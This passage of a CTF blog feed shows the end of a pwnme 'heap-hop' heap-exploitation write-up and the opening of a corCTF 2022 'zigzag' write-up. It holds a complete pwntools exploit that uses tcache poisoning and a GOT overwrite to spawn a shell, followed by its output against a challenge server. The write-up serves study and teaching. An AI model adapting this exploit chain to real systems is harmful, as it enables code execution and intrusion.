<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">malloc</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">scanf</span><span class="p">))</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="profit">
        PROFIT
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor PROFIT" href="#profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Then we just have to do:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="c1"># edit =&gt; realloc(&#34;/bin/sh&#34;) =&gt; system(&#34;/bin/sh&#34;)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><p>Which gives:</p>
<pre tabindex="0"><code>nasm@off:~/Documents/pwn/pwnme/heap$ python3 exploit.py REMOTE HOST=51.254.39.184 PORT=1336
[*] '/home/nasm/Documents/pwn/pwnme/heap/heap-hop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'/home/nasm/Documents/pwn/pwnme/heap'
[*] '/home/nasm/Documents/pwn/pwnme/heap/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/nasm/Documents/pwn/pwnme/heap/ld-linux-x86-64.so.2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 51.254.39.184 on port 1336: Done
[*] libc: 0x7faf9a27f000
[*] heap: 0x191d000
[*] one_gadget: 0x7faf9a36acf8 @ 0x404050
[*] Switching to interactive mode
$ id
uid=1000(player) gid=999(ctf) groups=999(ctf)
$ ls
flag.txt
run
$ cat flag.txt
PWNME{d1d_y0u_kn0w_r341l0c_c4n_b3h4v3_l1k3_th4t}
</code></pre><div class="gblog-post__anchorwrap">
    <h2 id="final-exploit">
        Final exploit
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#final-exploit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Final exploit" href="#final-exploit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Here is the final exploit:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfmate</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>

<span class="n">BINARY</span> <span class="o">=</span> <span class="s2">&#34;heap-hop&#34;</span>
<span class="n">LIBC</span> <span class="o">=</span> <span class="s2">&#34;/home/nasm/Documents/pwn/pwnme/heap/libc.so.6&#34;</span>
<span class="n">LD</span> <span class="o">=</span> <span class="s2">&#34;/home/nasm/Documents/pwn/pwnme/heap/ld-linux-x86-64.so.2&#34;</span>

<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LIBC</span><span class="p">)</span>
<span class="n">ld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LD</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
<span class="n">p64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span>
<span class="n">u64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span>
<span class="n">p32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span>
<span class="n">u32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u32</span>
<span class="n">p16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p16</span>
<span class="n">u16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u16</span>
<span class="n">p8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p8</span>
<span class="n">u8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u8</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>


<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="k">def</span> <span class="nf">one_gadget</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
  <span class="k">return</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;one_gadget&#39;</span><span class="p">,</span> <span class="s1">&#39;--raw&#39;</span><span class="p">,</span> <span class="n">filename</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)]</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">source ~/Downloads/pwndbg/gdbinit.py
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>

    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">trackLen</span><span class="p">,</span> <span class="n">trackContent</span><span class="p">):</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">trackLen</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">trackLen</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

    <span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;[+] track content :</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">newLength</span><span class="p">,</span> <span class="n">trackContent</span><span class="p">):</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">newLength</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="n">trackContent</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

    <span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;0&#34;</span><span class="p">)</span>
    
    <span class="c1"># Step one, 7 chunks to fill tcache later</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

    <span class="c1"># small chunk which will be used to the oob r/w</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">8</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;_&#34;</span><span class="p">)</span>
    <span class="c1"># victim chunk</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">9</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;_&#34;</span><span class="p">)</span>

    <span class="c1"># chunk with big size that will be used for the oob r/w</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">10</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;barreer&#34;</span><span class="p">)</span>
    <span class="n">create</span><span class="p">(</span><span class="mi">10</span><span class="o">+</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;barree2&#34;</span><span class="p">)</span>

    <span class="c1"># fill tcache</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>

    <span class="c1"># oob chunk </span>
    <span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="n">free</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;_&#34;</span><span class="p">)</span> <span class="c1"># allocated in 9</span>
    
    <span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># falls in the unsortedbin</span>

    <span class="n">read</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="c1"># oob read</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x219ce0</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># leak libc</span>

    <span class="c1"># leak heap to craft pointers</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;osef&#34;</span><span class="p">)</span> <span class="c1"># split unsortedbin chunk</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># tcache 0x20</span>

    <span class="n">read</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="c1"># oob read</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span>
    <span class="n">heap</span> <span class="o">=</span> <span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x2000</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="c1">#== tcache poisoning</span>
 
    <span class="c1"># get the 0x20 sized chunk that is right after the oob chunk</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;osef&#34;</span><span class="p">)</span>

    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

    <span class="c1"># tcache 0x20, count = 2, tcache poisoning is basically 10-&gt;fp = target</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> 

    <span class="c1"># oob write to set 10-&gt;fp = &amp;realloc@got-8 (due to alignment issues)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;Y&#34;</span> <span class="o">*</span> <span class="mh">0x60</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x21f0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">realloc</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)))</span> 

    <span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">one_gadget</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span> <span class="c1"># useless</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># 12 =&gt; b&#34;/binb/sh\0&#34;</span>

    <span class="c1"># given we falls on &amp;realloc@got-8, we overwrite got entries correctly </span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">malloc</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">scanf</span><span class="p">))</span>


    <span class="c1"># edit =&gt; realloc(&#34;/bin/sh&#34;) =&gt; system(&#34;/bin/sh&#34;)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">exp</span><span class="p">()</span>
</code></pre></div>]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/linux" term="linux" label="linux" />
                             
                                <category scheme="https://nasm.re/tags/pwnme" term="pwnme" label="pwnme" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                             
                                <category scheme="https://nasm.re/tags/tcache" term="tcache" label="tcache" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[corCTF 2022 - pwn] zigzag]]></title>
            <link href="https://nasm.re/posts/zigzag/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/zigzag/</id>
            
                    <author>
                        <name>nasm</name>
                    </author>
            <published>2022-08-08T00:00:00+00:00</published>
            <updated>2022-08-08T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h2 id="introduction">
        Introduction
        <a data-clipboard-text="https://nasm.re/posts/zigzag/#introduction" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Introduction" href="#introduction">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p><code>zigzag</code> is a zig heap challenge I did during the <a
  class="gblog-markdown__link"
  href="https://ctftime.org/event/1656"
  
  >corCTF 2022</a
> event. It was pretty exotic given we have to pwn a heap like challenge written in <a
  class="gblog-markdown__link"
  href="https://ziglang.org/"
  
  >zig</a
>. It is not using the C allocator but instead it uses the GeneralPurposeAllocator, which makes the challenge even more interesting. Find the tasks <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/tree/master/2022/corCTF/pwn/zieg"
  
  >here</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="tl-dr">
        TL; DR
        <a data-clipboard-text="https://nasm.re/posts/zigzag/#tl-dr" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor TL; DR" href="#tl-dr">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<ul>
<li>Understanding zig <code>GeneralPurposeAllocator</code> internals</li>
<li>Hiijack the <code>BucketHeader</code> of a given bucket to get a write what were / read what where primitive.</li>
<li>Leak stack + ROP on the fileRead function (mprotect + shellcode)</li>
<li>PROFIT</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="source-code-analysis">
        Source code analysis
        <a data-clipboard-text="https://nasm.re/posts/zigzag/#source-code-analysis" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Source code analysis" href="#source-code-analysis">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>The source code is procided:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="c1">// zig build-exe main.zig -O ReleaseSmall
</span><span class="c1">// built with zig version: 0.10.0-dev.2959+6f55b294f
</span><span class="c1"></span><span class="w">
